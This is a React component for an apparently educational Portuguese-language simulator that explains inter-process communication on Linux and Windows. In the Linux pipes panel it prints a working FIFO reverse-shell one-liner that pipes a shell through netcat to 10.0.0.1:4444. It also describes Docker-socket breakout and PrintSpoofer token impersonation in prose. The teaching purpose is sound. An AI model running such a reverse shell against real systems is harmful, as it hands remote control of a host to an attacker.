import React, { useState } from 'react';
import { 
  Network, 
  Layers, 
  ShieldAlert, 
  ArrowRightLeft, 
  Terminal, 
  Lock, 
  HelpCircle,
  FileCode,
  Radio,
  Zap,
  Info
} from 'lucide-react';
import { OSType } from '../types/simulator';

export const IPCArchitectureView: React.FC = () => {
  const [activeOS, setActiveOS] = useState<OSType>('linux');
  const [selectedMechanism, setSelectedMechanism] = useState<string>('pipes');

  return (
    <div className="space-y-6">
      {/* Cabeçalho */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="flex items-center space-x-3">
            <div className="p-3 bg-gradient-to-br from-indigo-500/20 to-purple-500/20 border border-indigo-500/30 rounded-xl text-indigo-400">
              <ArrowRightLeft className="w-6 h-6" />
            </div>
            <div>
              <h2 className="text-xl font-bold text-slate-100 flex items-center gap-2">
                Comunicação Inter-Processos (IPC) & Sockets
                <span className="text-xs px-2.5 py-0.5 rounded-full bg-indigo-500/10 text-indigo-300 border border-indigo-500/20 font-mono">
                  Unix Sockets vs Windows Named Pipes
                </span>
              </h2>
              <p className="text-xs text-slate-400 mt-1 max-w-2xl">
                Descubra como os processos transferem dados e trocam sinais na memória. Compreenda vetores de ataque reais como abuso de Named Pipes (PrintSpoofer) e sequestro de Docker Sockets.
              </p>
            </div>
          </div>

          {/* Seletor de SO */}
          <div className="flex items-center p-1 bg-slate-950 border border-slate-800 rounded-xl">
            <button
              onClick={() => setActiveOS('linux')}
              className={`px-4 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center space-x-2 ${
                activeOS === 'linux'
                  ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 shadow-sm'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              <span>Linux IPC (POSIX)</span>
            </button>
            <button
              onClick={() => setActiveOS('windows')}
              className={`px-4 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center space-x-2 ${
                activeOS === 'windows'
                  ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 shadow-sm'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              <span>Windows IPC (Win32 / NT)</span>
            </button>
          </div>
        </div>

        {/* Abas de Mecanismos */}
        <div className="flex flex-wrap gap-2 mt-6 pt-4 border-t border-slate-800 text-xs">
          {activeOS === 'linux' ? (
            <>
              <button
                onClick={() => setSelectedMechanism('pipes')}
                className={`px-3 py-1.5 rounded-lg transition ${
                  selectedMechanism === 'pipes' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30 font-bold' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Pipes Anônimos & FIFOs (mkfifo)
              </button>
              <button
                onClick={() => setSelectedMechanism('sockets')}
                className={`px-3 py-1.5 rounded-lg transition ${
                  selectedMechanism === 'sockets' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30 font-bold' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Unix Domain Sockets (/var/run)
              </button>
              <button
                onClick={() => setSelectedMechanism('shm')}
                className={`px-3 py-1.5 rounded-lg transition ${
                  selectedMechanism === 'shm' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30 font-bold' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Memória Compartilhada (/dev/shm)
              </button>
              <button
                onClick={() => setSelectedMechanism('signals')}
                className={`px-3 py-1.5 rounded-lg transition ${
                  selectedMechanism === 'signals' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30 font-bold' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Sinais do Kernel (kill, SIGTERM, SIGHUP)
              </button>
            </>
          ) : (
            <>
              <button
                onClick={() => setSelectedMechanism('named-pipes')}
                className={`px-3 py-1.5 rounded-lg transition ${
                  selectedMechanism === 'named-pipes' ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 font-bold' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Named Pipes (\\.\pipe\*)
              </button>
              <button
                onClick={() => setSelectedMechanism('alpc')}
                className={`px-3 py-1.5 rounded-lg transition ${
                  selectedMechanism === 'alpc' ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 font-bold' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                ALPC (Advanced Local Procedure Calls)
              </button>
              <button
                onClick={() => setSelectedMechanism('mailslots')}
                className={`px-3 py-1.5 rounded-lg transition ${
                  selectedMechanism === 'mailslots' ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 font-bold' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Mailslots & Sockets de Rede
              </button>
            </>
          )}
        </div>
      </div>

      {/* Detalhes do Mecanismo Selecionado */}
      {activeOS === 'linux' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-7 bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4 text-xs">
            {selectedMechanism === 'pipes' && (
              <div className="space-y-4">
                <h3 className="text-base font-bold text-amber-400 flex items-center gap-2">
                  <ArrowRightLeft className="w-4 h-4" /> Pipes Anônimos (|) vs Pipes Nomeados (mkfifo)
                </h3>
                <p className="text-slate-300 leading-relaxed">
                  Pipes são canais de comunicação unidirecionais baseados no modelo produtor-consumidor (FIFO - First-In, First-Out).
                </p>
                <div className="space-y-2">
                  <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-1">
                    <span className="font-bold text-emerald-400">Pipes Anônimos (Shell Pipelines)</span>
                    <p className="text-slate-400 text-[11px]">
                      Criados pela syscall <code>pipe(2)</code>. Conectam o STDOUT do processo pai ao STDIN do processo filho (ex: <code>ps aux | grep nginx</code>). O canal reside apenas na memória do kernel e se encerra quando os processos terminam.
                    </p>
                  </div>
                  <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-1">
                    <span className="font-bold text-amber-400">Pipes Nomeados (FIFOs)</span>
                    <p className="text-slate-400 text-[11px]">
                      Criados com o comando <code>mkfifo /tmp/my_pipe</code>. Possuem uma entrada de diretório no VFS (identificada pela permissão <code>prwxr-xr-x</code>), permitindo comunicação entre processos desvinculados que não compartilham relação de parentesco pai-filho.
                    </p>
                  </div>
                </div>

                <div className="p-3 bg-rose-950/20 border border-rose-900/40 rounded-xl space-y-1 text-xs">
                  <span className="font-bold text-rose-400 flex items-center gap-1.5">
                    <ShieldAlert className="w-3.5 h-3.5" /> Vetor de Ataque: Reverse Shell via FIFO
                  </span>
                  <p className="text-slate-400 text-[11px]">
                    Atacantes utilizam named pipes temporários em <code>/tmp</code> para criar reverse shells sem precisar de ferramentas como netcat compilado:
                  </p>
                  <code className="text-slate-300 font-mono text-[10px] block bg-slate-900 p-2 rounded">
                    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 4444 &gt; /tmp/f
                  </code>
                </div>
              </div>
            )}

            {selectedMechanism === 'sockets' && (
              <div className="space-y-4">
                <h3 className="text-base font-bold text-amber-400 flex items-center gap-2">
                  <Network className="w-4 h-4" /> Unix Domain Sockets (AF_UNIX)
                </h3>
                <p className="text-slate-300 leading-relaxed">
                  Sockets de domínio Unix permitem comunicação bidirecional de altíssima velocidade entre processos no mesmo host, evitando a sobrecarga de protocolos de rede TCP/IP (sem checksum, sem empacotamento IP).
                </p>
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-1 font-mono text-[11px]">
                  <div className="text-emerald-400 font-bold">Sockets Críticos do Sistema:</div>
                  <div className="text-slate-400">• /var/run/docker.sock (Docker Engine Daemon API)</div>
                  <div className="text-slate-400">• /run/systemd/journal/stdout (systemd-journald)</div>
                  <div className="text-slate-400">• /var/run/dbus/system_bus_socket (D-Bus IPC System Bus)</div>
                </div>

                <div className="p-3 bg-rose-950/20 border border-rose-900/40 rounded-xl space-y-1 text-xs">
                  <span className="font-bold text-rose-400 flex items-center gap-1.5">
                    <ShieldAlert className="w-3.5 h-3.5" /> Risco de Cibersegurança: Docker Socket Breakout
                  </span>
                  <p className="text-slate-400 text-[11px]">
                    Se um container ou usuário tiver permissão de escrita em <code>/var/run/docker.sock</code>, ele pode invocar a API do Docker para subir um container com a partição raiz do host montada, alcançando execução como <strong>root irrestrito no host</strong>!
                  </p>
                </div>
              </div>
            )}

            {selectedMechanism === 'shm' && (
              <div className="space-y-4">
                <h3 className="text-base font-bold text-amber-400 flex items-center gap-2">
                  <Layers className="w-4 h-4" /> Memória Compartilhada (Shared Memory & /dev/shm)
                </h3>
                <p className="text-slate-300 leading-relaxed">
                  O mecanismo mais rápido de IPC: dois ou mais processos mapeiam a mesma região de memória física em seus espaços de endereçamento virtual (VASP). Nenhuma cópia de dados pelo Kernel é necessária após o mapeamento inicial.
                </p>
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-2">
                  <span className="font-bold text-cyan-400">Sincronização via Semáforos</span>
                  <p className="text-slate-400 text-[11px]">
                    Como múltiplos processos leem e escrevem diretamente na memória compartilhada, semáforos ou mutexes POSIX são obrigatórios para evitar condições de corrida (Race Conditions).
                  </p>
                </div>
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-1 text-[11px] font-mono">
                  <span className="text-slate-400">Comandos de Diagnóstico:</span>
                  <div className="text-amber-300">ipcs -m (lista segmentos de memória compartilhada ativos)</div>
                  <div className="text-amber-300">ls -la /dev/shm (inspeciona arquivos POSIX shm montados em RAM)</div>
                </div>
              </div>
            )}

            {selectedMechanism === 'signals' && (
              <div className="space-y-4">
                <h3 className="text-base font-bold text-amber-400 flex items-center gap-2">
                  <Zap className="w-4 h-4" /> Sinais de Kernel (Software Interrupts)
                </h3>
                <p className="text-slate-300 leading-relaxed">
                  Sinais são notificações assíncronas enviadas pelo Kernel ou por outros processos para indicar eventos ou solicitar ações imediatas:
                </p>
                <div className="grid grid-cols-2 gap-2 font-mono text-[11px]">
                  <div className="p-2 bg-slate-950 border border-slate-800 rounded text-amber-300">
                    <strong>SIGHUP (1)</strong>: Hangup / Recarregar configurações
                  </div>
                  <div className="p-2 bg-slate-950 border border-slate-800 rounded text-cyan-300">
                    <strong>SIGINT (2)</strong>: Interrupção de teclado (Ctrl+C)
                  </div>
                  <div className="p-2 bg-slate-950 border border-slate-800 rounded text-rose-400 font-bold">
                    <strong>SIGKILL (9)</strong>: Término imediato (não capturável)
                  </div>
                  <div className="p-2 bg-slate-950 border border-slate-800 rounded text-emerald-300">
                    <strong>SIGTERM (15)</strong>: Solicitação de encerramento gracioso
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Painel Prático Linux */}
          <div className="lg:col-span-5 bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4 text-xs">
            <h4 className="text-sm font-bold text-slate-200 flex items-center gap-2">
              <Terminal className="w-4 h-4 text-amber-400" /> Experimente no Terminal Linux
            </h4>
            <div className="space-y-2 font-mono text-[11px] text-slate-300 bg-slate-950 p-3 rounded-xl border border-slate-800">
              <div className="text-slate-500"># 1. Crie um named pipe (FIFO):</div>
              <div>mkfifo /tmp/teste_pipe</div>
              <div className="text-slate-500 pt-2"># 2. Inspecione os atributos com stat:</div>
              <div>stat /tmp/teste_pipe</div>
              <div className="text-slate-500 pt-2"># 3. Liste sockets de domínio unix:</div>
              <div>ss -x</div>
            </div>
          </div>
        </div>
      )}

      {/* Detalhes Windows IPC */}
      {activeOS === 'windows' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-7 bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4 text-xs">
            {selectedMechanism === 'named-pipes' && (
              <div className="space-y-4">
                <h3 className="text-base font-bold text-cyan-400 flex items-center gap-2">
                  <Network className="w-4 h-4" /> Windows Named Pipes (\\.\pipe\*)
                </h3>
                <p className="text-slate-300 leading-relaxed">
                  Named Pipes no Windows são canais bidirecionais gerenciados pelo driver do sistema de arquivos de pipes nomeados (<code>NPFS - npfs.sys</code>). Eles permitem tanto comunicação local quanto remota via SMB (porta 445).
                </p>
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-1 font-mono text-[11px]">
                  <div className="text-cyan-400 font-bold">Pipes Críticos do Windows:</div>
                  <div className="text-slate-400">• \\.\pipe\spoolss (Serviço de Impressão Print Spooler)</div>
                  <div className="text-slate-400">• \\.\pipe\lsass (Local Security Authority)</div>
                  <div className="text-slate-400">• \\.\pipe\samr (Security Account Manager)</div>
                </div>

                <div className="p-3 bg-rose-950/20 border border-rose-900/40 rounded-xl space-y-1 text-xs">
                  <span className="font-bold text-rose-400 flex items-center gap-1.5">
                    <ShieldAlert className="w-3.5 h-3.5" /> Vetor Clássico de Ataque: PrintSpoofer & Pipe Potato
                  </span>
                  <p className="text-slate-400 text-[11px]">
                    Se um invasor tiver privilégio <code>SeImpersonatePrivilege</code> (ex: conta de serviço IIS), ele cria um named pipe falso e aciona a função <code>RpcOpenPrinter</code> para forçar o serviço Spooler a se conectar ao seu pipe. O atacante chama a API da Win32 <code>ImpersonateNamedPipeClient()</code> e <strong>assume instantaneamente o token de NT AUTHORITY\SYSTEM</strong>!
                  </p>
                </div>
              </div>
            )}

            {selectedMechanism === 'alpc' && (
              <div className="space-y-4">
                <h3 className="text-base font-bold text-cyan-400 flex items-center gap-2">
                  <Zap className="w-4 h-4" /> ALPC (Advanced Local Procedure Calls)
                </h3>
                <p className="text-slate-300 leading-relaxed">
                  O mecanismo de IPC de mais alto desempenho interno do Windows NT, utilizado diretamente pelos subsistemas do sistema (como RPC local e conexões entre processos de usuário e os serviços <code>csrss.exe</code> e <code>lsass.exe</code>).
                </p>
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-2">
                  <span className="font-bold text-emerald-400">Portas de Conexão ALPC</span>
                  <p className="text-slate-400 text-[11px]">
                    Objetos do tipo Port no Object Manager do Kernel. Mensagens pequenas (até 256 bytes) trafegam diretamente pela memória do Kernel; mensagens maiores utilizam seções de memória compartilhada mapeadas em tempo de execução.
                  </p>
                </div>
              </div>
            )}

            {selectedMechanism === 'mailslots' && (
              <div className="space-y-4">
                <h3 className="text-base font-bold text-cyan-400 flex items-center gap-2">
                  <Radio className="w-4 h-4" /> Mailslots & RPC Over Sockets
                </h3>
                <p className="text-slate-300 leading-relaxed">
                  Mailslots oferecem comunicação unidirecional do tipo "um-para-muitos" (broadcast), historicamente utilizados para descoberta de navegadores de rede (NetBIOS). Para comunicação moderna e confiável entre hosts, o Windows emprega <strong>RPC (Remote Procedure Call)</strong> sobre TCP/IP ou Named Pipes.
                </p>
              </div>
            )}
          </div>

          {/* Painel Prático Windows */}
          <div className="lg:col-span-5 bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4 text-xs">
            <h4 className="text-sm font-bold text-slate-200 flex items-center gap-2">
              <Terminal className="w-4 h-4 text-cyan-400" /> Experimente no PowerShell do WinLinx
            </h4>
            <div className="space-y-2 font-mono text-[11px] text-slate-300 bg-slate-950 p-3 rounded-xl border border-slate-800">
              <div className="text-slate-500"># 1. Liste Named Pipes ativos no sistema:</div>
              <div>Get-ChildItem \\.\pipe\</div>
              <div className="text-slate-500 pt-2"># 2. Verifique privilégio de personificação de token:</div>
              <div>whoami /priv</div>
              <div className="text-slate-500 pt-2"># 3. Entenda a técnica de impersonação:</div>
              <div>explain seimpersonate</div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
